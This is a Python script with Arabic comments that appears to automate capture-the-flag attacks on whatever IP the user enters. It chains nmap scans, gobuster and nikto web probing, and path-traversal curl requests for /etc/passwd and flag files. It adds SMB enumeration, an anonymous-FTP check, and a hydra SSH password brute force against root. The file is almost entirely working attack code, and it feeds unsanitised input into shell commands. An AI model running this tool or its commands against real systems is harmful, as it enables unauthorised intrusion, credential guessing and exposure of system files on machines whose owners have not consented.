import subprocess
import re
import time
import sys
from datetime import datetime

class GhenaFixed:
    def __init__(self, target_ip):
        self.ip = target_ip
        self.open_ports = []
        self.services = {}
        self.flag_found = None
        self.results_dir = f"GHENA_{target_ip}_{int(time.time())}"
        subprocess.run(f"mkdir -p {self.results_dir}", shell=True)

    def log(self, msg, color=''):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def run_cmd(self, cmd, timeout=600):
        self.log(f"▶️ {cmd}")
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=timeout)
            # حفظ النتيجة في ملف
            safe_cmd = cmd.replace(' ', '_').replace('/', '_')[:50]
            with open(f"{self.results_dir}/{safe_cmd}.txt", 'w') as f:
                f.write(result)
            self.analyze_output(result, cmd)
            return result
        except subprocess.TimeoutExpired:
            self.log("⏰ الأمر تجاوز الوقت المحدد، يتم تخطيه.")
            return ""
        except subprocess.CalledProcessError as e:
            self.log(f"⚠️ الأمر فشل (رمز {e.returncode})، يتم التخطي.")
            return ""
        except Exception as e:
            self.log(f"❌ خطأ غير متوقع: {e}")
            return ""

    def analyze_output(self, output, cmd):
        # استخراج المنافذ من nmap
        if "nmap" in cmd:
            for line in output.split('\n'):
                m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    port, svc = int(m.group(1)), m.group(2)
                    if port not in self.open_ports:
                        self.open_ports.append(port)
                        self.services[port] = svc
                        self.log(f"🔓 منفذ {port}: {svc}")

        # البحث عن العلم
        flag_match = re.search(r'flag\{[^}]+\}|FLAG\{[^}]+\}', output)
        if flag_match:
            self.flag_found = flag_match.group(0)
            self.log(f"🎯 العلم: {self.flag_found}")

    def run(self):
        self.log("="*60)
        self.log(f"🚀 بدء الهجوم التلقائي على {self.ip}")
        self.log("="*60)

        # 1. فحص سريع (nmap أساسي)
        self.run_cmd(f"nmap -sV -T4 {self.ip}")

        if self.flag_found:
            self.show_flag()
            return

        # 2. فحص جميع المنافذ (مع وقت أقصى 1200 ثانية)
        self.log("\n📌 فحص جميع المنافذ (قد يستغرق وقتاً)...")
        self.run_cmd(f"nmap -sC -sV -p- -T4 {self.ip}", timeout=1200)

        # 3. هجمات حسب الخدمات المكتشفة
        for port in self.open_ports:
            svc = self.services.get(port, '').lower()
            
            # الويب
            if port in [80, 443, 8080, 8443] or 'http' in svc:
                protocol = 'https' if port in [443, 8443] else 'http'
                self.log(f"\n🌐 فحص الويب على المنفذ {port}")
                
                # Gobuster (تصحيح الاسم)
                self.run_cmd(f"gobuster dir -u {protocol}://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50")
                
                # Nikto
                self.run_cmd(f"nikto -h {protocol}://{self.ip}:{port}")
                
                # LFI test (تصحيح المسار)
                self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../etc/passwd'")
                
            # SMB
            if port in [139, 445] or 'smb' in svc or 'microsoft-ds' in svc:
                self.log(f"\n📁 فحص SMB")
                self.run_cmd(f"enum4linux -a {self.ip}")
                
            # FTP
            if port == 21 or 'ftp' in svc:
                self.log(f"\n📂 فحص FTP")
                self.run_cmd(f"nmap --script ftp-anon -p 21 {self.ip}")
                
            # SSH
            if port == 22 or 'ssh' in svc:
                self.log(f"\n🔐 فحص SSH")
                # حاول باستخدام قاموس صغير (rockyou كبير جداً قد يعلق)
                self.run_cmd(f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{self.ip} -t 4", timeout=300)

        # 4. بحث متقدم عن العلم في مسارات شائعة
        if not self.flag_found and any(p in [80, 443, 8080, 8443] for p in self.open_ports):
            self.log("\n🔍 بحث متقدم عن العلم...")
            paths = [
                "/flag.txt", "/root/flag.txt", "/home/*/flag.txt",
                "/var/www/flag.txt", "/tmp/flag.txt", "/.flag",
                "/root/root.txt", "/root/root.flag"
            ]
            for path in paths:
                if self.flag_found:
                    break
                for port in [p for p in self.open_ports if p in [80, 443, 8080, 8443]]:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    # محاولة LFI مباشرة
                    self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../..{path}'")
                    # محاولة الوصول المباشر
                    self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}{path}'")

        self.show_flag()

    def show_flag(self):
        if self.flag_found:
            print("\n" + "="*60)
            print(f"🎯🎯🎯 العلم النهائي: {self.flag_found} 🎯🎯🎯")
            print("="*60)
            # حفظ العلم في ملف
            with open(f"{self.results_dir}/FLAG.txt", 'w') as f:
                f.write(self.flag_found)
        else:
            print("\n❌ لم يتم العثور على العلم. راجع ملفات النتائج.")

if __name__ == "__main__":
    print("\n" + "="*60)
    print("GHENA ULTIMATE - النسخة المصححة (بدون أخطاء)")
    print("="*60)
    ip = input("IP الهدف: ").strip()
    if ip:
        bot = GhenaFixed(ip)
        bot.run()
    else:
        print("❌ الرجاء إدخال IP صحيح.")
